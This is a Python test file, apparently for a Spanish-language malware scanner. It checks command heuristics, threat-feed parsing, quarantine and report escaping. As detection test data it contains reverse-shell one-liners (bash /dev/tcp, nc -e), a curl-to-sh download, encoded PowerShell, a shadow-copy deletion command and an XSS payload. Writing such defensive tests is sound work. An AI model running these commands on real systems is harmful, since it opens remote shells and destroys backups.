"""Pruebas del núcleo: heurísticas, parsers de feeds, almacén, escaneo y informe."""

from __future__ import annotations

import hashlib
import json
import os

import pytest

from protecx import config, heuristics
from protecx.context import ScanOptions
from protecx.engine import run_scan
from protecx.models import Finding, Severity
from protecx.reporting.writer import render_html
from protecx.signatures import SignatureStore, YaraEngine
from protecx.signatures.parsers import (parse_ip_list, parse_malwarebazaar_csv,
                                        parse_threatfox_csv, parse_urlhaus_csv)
from protecx.signatures.store import EICAR_SHA256

# Cadena de prueba estándar EICAR: inofensiva, la reconoce cualquier antivirus
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture
def store(tmp_path):
    return SignatureStore(tmp_path / "sig.db")


# -- heurísticas ------------------------------------------------------------
@pytest.mark.parametrize("command, expected", [
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Severity.CRITICAL),
    ("nc -e /bin/sh 203.0.113.9 4444", Severity.CRITICAL),
    ("powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", Severity.HIGH),
    ("curl http://x.test/a.sh | sh", Severity.HIGH),
    ("vssadmin delete shadows /all /quiet", Severity.CRITICAL),
])
def test_malicious_commands_are_flagged(command, expected):
    assert heuristics.evaluate_command(command)[0][0] == expected


@pytest.mark.parametrize("command", ["ls -la /tmp", "python3 manage.py runserver", "git status"])
def test_normal_commands_are_not_flagged(command):
    assert heuristics.evaluate_command(command) == []


def test_extract_executable_handles_quotes():
    assert heuristics.extract_executable('"C:/Program Files/app/a.exe" --flag') == "C:/Program Files/app/a.exe"
    assert heuristics.extract_executable("/usr/bin/python3 /opt/x.py") == "/usr/bin/python3"


def test_masquerading_detected_only_outside_system32():
    assert heuristics.is_masquerading("svchost.exe", r"C:\Users\x\AppData\Local\Temp\svchost.exe")
    assert not heuristics.is_masquerading("svchost.exe", r"C:\Windows\System32\svchost.exe")


# -- parsers de feeds -------------------------------------------------------
def test_parse_feeds():
    sha = "a" * 64
    mb = (f'# "first_seen_utc", "sha256_hash", "md5_hash", "sha1_hash", "reporter", "file_name", '
          f'"file_type_guess", "mime_type", "signature"\n'
          f'"2026-10-01 10:00:00", "{sha}", "", "", "r", "a.exe", "exe", "x", "AgentTesla"\n'
          f'"2026-10-01 10:00:00", "{"c" * 64}", "", "", "r", "b.exe", "exe", "x", "n/a"\n'
          '"2026-10-01 10:00:00", "basura", "", "", "r", "c.exe", "exe", "x", "X"\n')
    assert parse_malwarebazaar_csv(mb).hashes == [(sha, "AgentTesla"), ("c" * 64, "malware")]
    assert parse_ip_list("# x\n203.0.113.5\nno-ip\n").iocs == [("ip", "203.0.113.5", "botnet-c2")]
    uh = ('# id,dateadded,url,url_status,last_online,threat,tags,urlhaus_link,reporter\n'
          '1,2026-10-01,http://evil.test/a.exe,online,2026-10-01,malware_download,,l,r\n'
          '2,2026-10-01,http://198.51.100.7:8080/b,online,2026-10-01,malware_download,,l,r\n'
          '3,2026-10-01,http://evil.test/c,online,2026-10-01,malware_download,,l,r\n'
          '4,2026-10-01,http://gone.test/d,offline,2026-10-01,malware_download,,l,r\n')
    assert sorted(parse_urlhaus_csv(uh).iocs) == [("domain", "evil.test", "malware_download"),
                                                  ("ip", "198.51.100.7", "malware_download")]


def test_parse_threatfox_reads_header_from_comment():
    csv_text = (
        '# "first_seen_utc", "ioc_id", "ioc_value", "ioc_type", "threat_type", "fk_malware", "malware_alias", "malware_printable"\n'
        '"2026-10-01 10:00:00", "1", "203.0.113.20:443", "ip:port", "botnet_cc", "win.x", "", "Example RAT"\n'
        f'"2026-10-01 10:00:00", "2", "{"b" * 64}", "sha256_hash", "payload", "win.x", "", "Example RAT"\n'
        '"2026-10-01 10:00:00", "3", "bad.example", "domain", "botnet_cc", "win.x", "", "Example RAT"\n'
    )
    parsed = parse_threatfox_csv(csv_text)
    assert ("ip", "203.0.113.20", "Example RAT") in parsed.iocs
    assert ("domain", "bad.example", "Example RAT") in parsed.iocs
    assert parsed.hashes == [("b" * 64, "Example RAT")]


# -- almacén ----------------------------------------------------------------
def test_eicar_hash_constant_is_correct():
    assert hashlib.sha256(EICAR.encode()).hexdigest() == EICAR_SHA256


def test_replace_source_expires_old_entries(store):
    store.replace_source("feed", iocs=[("ip", "203.0.113.1", "x")])
    assert store.lookup_ioc("ip", "203.0.113.1")
    store.replace_source("feed", iocs=[("ip", "203.0.113.2", "x")])
    assert store.lookup_ioc("ip", "203.0.113.1") is None
    assert store.info()["iocs"] == 1


# -- escaneo de extremo a extremo -------------------------------------------
def test_file_scan_detects_eicar_and_report_is_safe(store, tmp_path):
    sample = tmp_path / "samples"
    sample.mkdir()
    (sample / "eicar.com").write_text(EICAR)
    (sample / "revshell.sh").write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")

    report = run_scan(ScanOptions(paths=[sample], scanners=("files",)), store,
                      YaraEngine(tmp_path / "none", tmp_path / "cache"))

    titles = [f.title for f in report.findings]
    assert any("EICAR" in t for t in titles), titles
    assert any("Script sospechoso" in t for t in titles), titles
    assert report.max_severity is Severity.CRITICAL
    assert report.stats["files"]["archivos_analizados"] == 2

    # Un hallazgo cuyo texto intenta cerrar la etiqueta <script> no debe romper el informe
    report.findings.append(Finding("processes", Severity.HIGH, "</script><img src=x onerror=alert(1)>"))
    html = render_html(report)
    assert "<img src=x" not in html
    payload = html.split('id="data">', 1)[1].split("</script>", 1)[0]
    assert json.loads(payload)["findings"][-1]["title"].startswith("</script>")


def test_live_scanners_run_without_crashing(store, tmp_path):
    options = ScanOptions(scanners=("system", "processes", "network", "persistence"))
    report = run_scan(options, store, YaraEngine(tmp_path / "none", tmp_path / "cache"))
    assert not [w for w in report.warnings if "interrumpió" in w], report.warnings
    assert report.stats["processes"]["procesos_analizados"] > 0


# -- explicaciones para usuarios no técnicos ----------------------------------
def test_every_finding_gets_plain_explanation_and_subject(tmp_path):
    from protecx import explain
    from protecx.models import ScanReport
    sample = tmp_path / "a.exe"
    sample.write_bytes(b"MZ" + b"0" * 10)
    report = ScanReport(host={}, started_at="")
    report.findings += [
        Finding("processes", Severity.HIGH, "svchost.exe se ejecuta desde una carpeta inusual",
                evidence={"pid": os.getpid(), "ruta": str(sample)}),
        Finding("x", Severity.LOW, "Título desconocido"),
    ]
    explain.enrich(report)
    first, second = report.findings
    assert "disfraz" in first.explanation["que_es"] or "Disfrazarse" in first.explanation["por_que"]
    assert first.subject["Nombre del archivo"] == "a.exe" and "Lo inició el usuario" in first.subject
    assert second.explanation["que_hacer"] and second.subject == {}


def test_recent_folder_shortcuts_are_not_double_extension():
    from protecx.scanners.files import _DOUBLE_EXTENSION, _is_windows_recent_shortcut
    recent = r"C:\Users\k\AppData\Roaming\Microsoft\Windows\Recent\immich-go_Windows_x86_64.zip.lnk"
    assert _DOUBLE_EXTENSION.search(recent) and _is_windows_recent_shortcut(recent)
    assert not _is_windows_recent_shortcut(r"C:\Users\k\Downloads\factura.pdf.lnk")
    assert not _is_windows_recent_shortcut(r"C:\Users\k\Recent\factura.pdf.exe")


def test_inventory_rows_of_suspicious_processes_and_connections_are_flagged():
    from protecx import explain
    from protecx.models import ScanReport
    report = ScanReport(host={}, started_at="")
    report.inventory = {
        "processes": [{"pid": 1, "proceso": "ok", "ruta": "/usr/bin/ok"}, {"pid": 7, "proceso": "bad", "ruta": "/tmp/bad"}],
        "connections": [
            {"pid": 7, "remoto": "1.1.1.1:443", "puerto": 443, "ruta": "/tmp/bad", "sentido": "saliente"},
            {"pid": 1, "remoto": "9.9.9.9:443", "puerto": 443, "ruta": "/usr/bin/ok", "sentido": "entrante"},
            {"pid": 9, "remoto": "5.5.5.5:80", "puerto": 80, "ruta": "/usr/bin/other", "sentido": "saliente"},
        ],
    }
    report.findings.append(Finding("network", Severity.CRITICAL, "Conexión a una IP maliciosa conocida (X)",
                                   evidence={"pid": 9, "remoto": "5.5.5.5:80", "ruta": "/usr/bin/other"}))
    report.findings.append(Finding("processes", Severity.HIGH, "Proceso ejecutándose desde /tmp",
                                   evidence={"pid": 7, "ruta": "/tmp/bad"}))
    explain.enrich(report)
    procs, conns = report.inventory["processes"], report.inventory["connections"]
    assert [r["proceso"] for r in procs] == ["bad", "ok"] and procs[0]["alerta"] == "Alto" and procs[1]["alerta"] == ""
    assert [r["alerta"] for r in conns] == ["Crítico", "Alto", ""]   # más graves primero
    assert list(conns[0])[:2] == ["alerta", "motivo"]


def test_scanner_skips_its_own_source_folder():
    from protecx import config
    from protecx.scanners.files import _skip_dirs
    from protecx.utils import normalize_path
    assert normalize_path(str(config.app_dir() / "protecx")) in _skip_dirs()


# -- barra de progreso --------------------------------------------------------
class _FakeTTY(__import__("io").StringIO):
    encoding = "utf-8"

    def isatty(self):
        return True


def test_progress_bar_draws_in_place_and_clears_on_close():
    from protecx.reporting.progress import ScanProgress
    out = _FakeTTY()
    bar = ScanProgress(out)
    bar("Procesos", stage=1, stages=4)
    bar("Archivos", stage=3, stages=4)
    bar("archivos", count=3549)
    bar("Cargando algo…")                      # mensaje suelto: no rompe la barra
    text = out.getvalue()
    assert "3/4 Archivos" in text and "3.549 archivos" in text and "Cargando algo…\n" in text
    assert "\n" not in text.replace("Cargando algo…\n", "")  # la barra solo usa \r
    bar.close()
    assert out.getvalue().endswith("\r") and not bar._drawn


def test_progress_without_terminal_prints_plain_lines():
    import io
    from protecx.reporting.progress import ScanProgress
    out = io.StringIO()
    bar = ScanProgress(out)
    bar("Red", stage=2, stages=4)
    assert out.getvalue() == "Analizando: Red…\n"


# -- menú interactivo -----------------------------------------------------------
def test_menu_builds_the_right_commands(monkeypatch, tmp_path, capsys):
    import protecx.cli
    from protecx import config, menu
    calls = []
    monkeypatch.setattr(protecx.cli, "main", lambda argv=None: calls.append(argv) or 0)
    monkeypatch.setattr(menu.os, "system", lambda cmd: 0)           # no limpiar la pantalla del test
    monkeypatch.setenv("PROTECX_HOME", str(tmp_path))
    monkeypatch.setenv(config.AUTH_KEY_ENV, "clave")                # así «actualizar» no pide la clave
    answers = iter(["2", "", "3", str(tmp_path), "", "3", "/no/existe", "", "5", "n", "", "6", "", "x", "0"])
    assert menu.run(ask=lambda prompt: next(answers)) == 0
    assert calls == [
        ["scan", "--only", "network", "--monitor", "60", "--open"],
        ["scan", "--only", "files", "--open", "--path", str(tmp_path)],   # carpeta inexistente y «no» al disco entero: nada
        ["update"],
    ]
    assert "Análisis de red" in capsys.readouterr().out


# -- comparación con el análisis anterior ----------------------------------------
def _finding(title, **evidence):
    return Finding("files", Severity.HIGH, title, evidence=evidence)


def test_compare_marks_new_unchanged_and_resolved(tmp_path):
    from protecx import history
    from protecx.models import ScanReport
    old = ScanReport(host={}, started_at="2026-10-29T10:00:00", stats={"files": {}})
    old.findings += [_finding("A", ruta="/x/a"), _finding("B", ruta="/x/b")]
    (tmp_path / "protecx-20261029-100000.json").write_text(json.dumps(old.to_dict()), encoding="utf-8")

    new = ScanReport(host={}, started_at="2026-10-30T10:00:00", stats={"files": {}})
    new.findings += [_finding("A", ruta="/X/A", pid=1), _finding("C", ruta="/x/c")]  # mismo hallazgo A aunque cambie pid/mayúsculas
    history.compare(new, tmp_path)
    assert [f.is_new for f in new.findings] == [False, True]
    assert (new.comparison["new"], new.comparison["unchanged"]) == (1, 1)
    assert [r["title"] for r in new.comparison["resolved"]] == ["B"]
    assert new.sorted_findings()[0].title == "C"          # a igualdad de gravedad, los nuevos primero


def test_compare_ignores_previous_reports_with_fewer_modules(tmp_path):
    from protecx import history
    from protecx.models import ScanReport
    net_only = ScanReport(host={}, started_at="x", stats={"network": {}})
    (tmp_path / "protecx-1.json").write_text(json.dumps(net_only.to_dict()), encoding="utf-8")
    full = ScanReport(host={}, started_at="y", stats={"network": {}, "files": {}})
    full.findings.append(_finding("A", ruta="/a"))
    history.compare(full, tmp_path)
    assert full.comparison == {} and full.findings[0].is_new is None   # sin referencia válida: nada se marca como nuevo


# -- firma digital --------------------------------------------------------------
def test_signature_parsing_and_publisher():
    from protecx import signature
    assert signature.publisher_name('CN="Microsoft Corporation", O=Microsoft Corporation, C=US') == "Microsoft Corporation"
    assert signature.publisher_name("CN=Acme Ltd, O=Acme") == "Acme Ltd"
    out = '[{"i":1,"status":"Valid","subject":"CN=Acme Ltd, O=Acme"},{"i":0,"status":"NotSigned","subject":""}]'
    sigs = signature.parse(out, ["a.exe", "b.exe"])
    assert sigs["b.exe"].valid and "Acme Ltd" in sigs["b.exe"].describe()
    assert sigs["a.exe"].describe() == "Sin firma digital"
    assert signature.parse('{"i":0,"status":"HashMismatch","subject":"CN=X"}', ["a"])["a"].tampered   # un solo resultado = objeto
    assert signature.parse("basura", ["a"]) == {} and signature.check(["a"]) == {}                   # fuera de Windows no hace nada


def test_valid_signature_lowers_location_findings_but_not_known_malware(monkeypatch, tmp_path):
    from protecx import explain, signature
    from protecx.models import ScanReport
    exe = tmp_path / "setup.exe"
    exe.write_bytes(b"MZ")
    sigs = {str(exe): signature.Signature("Valid", "Acme Ltd")}
    monkeypatch.setattr(explain.signature, "check", lambda paths: sigs)
    report = ScanReport(host={}, started_at="")
    report.findings += [
        Finding("files", Severity.HIGH, "Ejecutable en carpeta temporal", evidence={"ruta": str(exe)}),
        Finding("files", Severity.CRITICAL, "Malware conocido: X", evidence={"ruta": str(exe)}),
    ]
    explain.enrich(report)
    location, known = report.findings
    assert location.severity is Severity.MEDIUM and location.evidence["gravedad_original"] == "Alto"
    assert "Acme Ltd" in location.subject["Nota"] and "Firma digital" in location.subject
    assert known.severity is Severity.CRITICAL                       # un hash conocido nunca se rebaja

    sigs[str(exe)] = signature.Signature("HashMismatch", "Acme Ltd")
    low = Finding("files", Severity.LOW, "Ejecutable en carpeta temporal", evidence={"ruta": str(exe)})
    report.findings = [low]
    explain.enrich(report)
    assert low.severity is Severity.HIGH and "rota" in low.subject["Nota"]


# -- cuarentena -----------------------------------------------------------------
@pytest.fixture
def quarantine_env(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "app_dir", lambda: tmp_path / "app")     # nunca tocar la carpeta real del proyecto
    (tmp_path / "app").mkdir()
    return tmp_path


def test_quarantine_roundtrip_keeps_content_and_permissions(quarantine_env):
    from protecx import quarantine
    victim = quarantine_env / "malo.exe"
    victim.write_bytes(b"MZ-contenido")
    victim.chmod(0o755)
    item = quarantine.add(str(victim), reason="prueba")
    assert not victim.exists() and [i.id for i in quarantine.list_items()] == [item.id]
    blob = quarantine_env / "app" / "quarantine" / f"{item.id}.quar"
    assert blob.read_bytes() == b"MZ-contenido" and not blob.stat().st_mode & 0o111   # inofensivo: sin permiso de ejecución

    quarantine.restore(item.id[:12])                                        # basta un prefijo único
    assert victim.read_bytes() == b"MZ-contenido" and victim.stat().st_mode & 0o777 == 0o755
    assert quarantine.list_items() == []


def test_quarantine_refuses_system_folders_missing_files_and_overwrites(quarantine_env):
    from protecx import quarantine
    with pytest.raises(quarantine.QuarantineError):
        quarantine.add("/usr/bin/env")                                      # carpeta del sistema sin --force
    with pytest.raises(quarantine.QuarantineError):
        quarantine.add(str(quarantine_env / "no-existe.exe"))
    f = quarantine_env / "a.bin"
    f.write_bytes(b"1")
    item = quarantine.add(str(f))
    f.write_bytes(b"2")                                                     # alguien creó otro archivo en su sitio
    with pytest.raises(quarantine.QuarantineError):
        quarantine.restore(item.id)
    quarantine.delete(item.id)
    assert quarantine.list_items() == [] and f.read_bytes() == b"2"


def test_menu_quarantines_files_from_last_report(quarantine_env, monkeypatch, capsys):
    from protecx import menu, quarantine
    bad = quarantine_env / "bad.exe"
    bad.write_bytes(b"MZ")
    reports = config.reports_dir()
    (reports / "protecx-20261030-100000.json").write_text(json.dumps({"findings": [
        {"severity": "high", "severity_label": "Alto", "title": "Ejecutable en Temp", "evidence": {"ruta": str(bad)}},
        {"severity": "low", "severity_label": "Bajo", "title": "x", "evidence": {"ruta": str(bad)}}]}), encoding="utf-8")
    monkeypatch.setattr(menu.os, "system", lambda cmd: 0)
    answers = iter(["9", "1", "todos", "s", "2", "", "0", "", "0"])        # aislar, ver, volver, salir
    assert menu.run(ask=lambda prompt: next(answers)) == 0
    out = capsys.readouterr().out
    assert "aislado" in out and not bad.exists() and len(quarantine.list_items()) == 1


def test_report_suggests_quarantine_command_only_for_real_suspicious_files(quarantine_env):
    from protecx import explain
    from protecx.models import ScanReport
    f = quarantine_env / "x.exe"
    f.write_bytes(b"MZ")
    report = ScanReport(host={}, started_at="")
    report.findings += [Finding("files", Severity.HIGH, "Ejecutable en Temp", evidence={"ruta": str(f)}),
                        Finding("files", Severity.LOW, "Ejecutable en Temp", evidence={"ruta": str(f)})]
    explain.enrich(report)
    assert "quarantine add" in report.findings[0].subject["Para aislarlo"]
    assert "Para aislarlo" not in report.findings[1].subject


# -- clave de abuse.ch guardada ---------------------------------------------------
def test_keystore_roundtrip_is_private_and_not_plaintext(monkeypatch, tmp_path):
    from protecx import keystore
    monkeypatch.setenv("PROTECX_HOME", str(tmp_path))
    monkeypatch.setattr(config, "IS_WINDOWS", False)
    assert keystore.load() is None
    keystore.save("abcDEF123_-xyz789")
    raw = keystore.path().read_bytes()
    assert b"abcDEF123_-xyz789" not in raw and keystore.path().stat().st_mode & 0o777 == 0o600
    assert keystore.load() == "abcDEF123_-xyz789"
    keystore.path().write_bytes(b"B64-0600\n!!!no-es-base64")            # archivo corrupto: se ignora, no revienta
    assert keystore.load() is None
    assert keystore.forget() and not keystore.forget()


def test_keystore_uses_dpapi_on_windows_and_rejects_bad_keys(monkeypatch, tmp_path):
    from protecx import keystore
    monkeypatch.setenv("PROTECX_HOME", str(tmp_path))
    monkeypatch.setattr(config, "IS_WINDOWS", True)
    monkeypatch.setattr(keystore, "_dpapi", lambda protect, data: data[::-1])     # DPAPI simulado y reversible
    keystore.save("abcDEF123_-xyz789")
    assert keystore.path().read_bytes().startswith(b"DPAPI1\n") and b"abcDEF123" not in keystore.path().read_bytes()
    assert keystore.load() == "abcDEF123_-xyz789"
    for bad in ("corta", "../../etc/passwd", "con espacios y mas", "a/b" * 10):
        assert not keystore.is_valid(bad)
    with pytest.raises(ValueError):
        keystore.save("../../x")


def test_explicit_key_is_saved_once_and_then_reused(monkeypatch, tmp_path):
    import argparse
    from protecx import cli, keystore
    monkeypatch.setenv("PROTECX_HOME", str(tmp_path))
    monkeypatch.delenv(config.AUTH_KEY_ENV, raising=False)
    monkeypatch.setattr(config, "IS_WINDOWS", False)
    assert cli._auth_key(argparse.Namespace(auth_key="clave-de-prueba-123")) == "clave-de-prueba-123"
    assert cli._auth_key(argparse.Namespace(auth_key=None)) == "clave-de-prueba-123"      # la siguiente vez no hace falta escribirla
    monkeypatch.setenv(config.AUTH_KEY_ENV, "otra-clave-del-entorno")
    assert cli._auth_key(argparse.Namespace(auth_key=None)) == "otra-clave-del-entorno"   # el entorno manda, y no se guarda
    assert keystore.load() == "clave-de-prueba-123"
    assert cli._auth_key(argparse.Namespace(auth_key="mala/clave")) == "otra-clave-del-entorno"  # inválida: se ignora


# -- instalar ClamAV desde ProtecX -------------------------------------------------
def _fake_which(available):
    return lambda name: f"/bin/{name}" if name in available else None


def test_clamav_install_plan_per_platform(monkeypatch):
    from protecx import clamav_setup
    monkeypatch.setattr(config, "IS_MAC", False)
    monkeypatch.setattr(config, "IS_WINDOWS", True)
    monkeypatch.setattr(clamav_setup.shutil, "which", _fake_which({"winget"}))
    plan = clamav_setup.make_plan()
    assert plan.commands[0][:4] == ["winget", "install", "--id", "Cisco.ClamAV"] and "--exact" in plan.commands[0]
    monkeypatch.setattr(clamav_setup.shutil, "which", _fake_which(set()))
    assert clamav_setup.make_plan() is None                                    # sin winget: instrucciones manuales

    monkeypatch.setattr(config, "IS_WINDOWS", False)
    monkeypatch.setattr(clamav_setup.os, "geteuid", lambda: 1000)
    monkeypatch.setattr(clamav_setup.shutil, "which", _fake_which({"apt-get", "sudo"}))
    plan = clamav_setup.make_plan()
    assert plan.sudo == ("sudo",) and plan.commands[1] == ["sudo", "apt-get", "install", "-y", "clamav", "clamav-freshclam"]
    monkeypatch.setattr(clamav_setup.shutil, "which", _fake_which({"apt-get"}))  # ni root ni sudo
    assert clamav_setup.make_plan() is None
    monkeypatch.setattr(clamav_setup.os, "geteuid", lambda: 0)
    plan = clamav_setup.make_plan()
    assert plan.sudo == () and plan.commands[1][0] == "apt-get"


def test_example_line_is_commented_out_and_nothing_else(tmp_path):
    from protecx import clamav_setup
    conf = tmp_path / "freshclam.conf"
    conf.write_text("# nota\nExample\nDatabaseMirror x\n#Example\n", encoding="utf-8")
    assert clamav_setup._comment_example(conf)
    assert conf.read_text(encoding="utf-8") == "# nota\n#Example\nDatabaseMirror x\n#Example\n"
    assert clamav_setup._comment_example(tmp_path / "no-existe.conf")


def test_clamav_found_in_install_dir_without_path(monkeypatch, tmp_path):
    from protecx.signatures import clamav
    (tmp_path / "ClamAV").mkdir()
    exe = tmp_path / "ClamAV" / "clamscan.exe"
    exe.write_text("", encoding="utf-8")
    monkeypatch.setattr(clamav.shutil, "which", lambda name: None)
    monkeypatch.setattr(clamav, "IS_WINDOWS", True)
    monkeypatch.setenv("ProgramFiles", str(tmp_path))
    assert clamav.find_tool("clamscan") == str(exe) and clamav.find_tool("freshclam") is None


def test_install_flow_confirms_runs_and_configures(monkeypatch):
    from protecx import clamav_setup
    plan = clamav_setup.Plan("apt", [["apt-get", "install", "-y", "clamav"]], "nota", ())
    ran, logs = [], []

    class Clam:                                    # ClamAV «no instalado» hasta que corre el instalador
        @property
        def available(self):
            return bool(ran)
        scan_exe = "/usr/bin/clamscan"

    monkeypatch.setattr(clamav_setup, "ClamAV", Clam)
    monkeypatch.setattr(clamav_setup, "make_plan", lambda: plan)
    monkeypatch.setattr(clamav_setup, "configure", lambda p, log: True)
    monkeypatch.setattr(clamav_setup.subprocess, "run",
                        lambda cmd, **kw: ran.append(cmd) or type("R", (), {"returncode": 0})())
    assert clamav_setup.run(ask=lambda q: "n", log=logs.append) == 1 and ran == []          # sin confirmar no se toca nada
    assert clamav_setup.run(ask=lambda q: "s", log=logs.append) == 0 and ran == [["apt-get", "install", "-y", "clamav"]]
    assert any("apt-get install" in line for line in logs) and any("ClamAV listo" in line for line in logs)


def test_menu_offers_install_only_when_clamav_is_missing(monkeypatch):
    from protecx import menu
    monkeypatch.setattr(menu, "ClamAV", lambda: type("C", (), {"available": False})())
    assert "c" in {k for k, _, _ in menu._options()}
    monkeypatch.setattr(menu, "ClamAV", lambda: type("C", (), {"available": True})())
    assert "c" not in {k for k, _, _ in menu._options()}
    assert menu._args_for("1", input) == ["scan", "--open", "--clamav"]                     # y entonces se usa en los análisis
